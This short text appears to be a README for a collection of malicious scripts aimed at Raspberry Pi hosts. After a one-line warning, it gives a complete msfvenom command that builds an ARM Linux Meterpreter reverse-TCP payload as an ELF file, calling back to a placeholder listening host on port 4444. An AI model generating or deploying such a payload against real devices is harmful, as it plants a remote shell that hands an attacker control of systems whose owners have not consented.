The scripts you find here are malicious! Don't touch!

To generate a new shellscript that will work on the raspberry pi hosts, use the following command:

msfvenom --arch armle --platform linux -p linux/armle/meterpreter/reverse_tcp LHOST=<SetListeningHost> LPORT=4444 -f elf > shell.elf
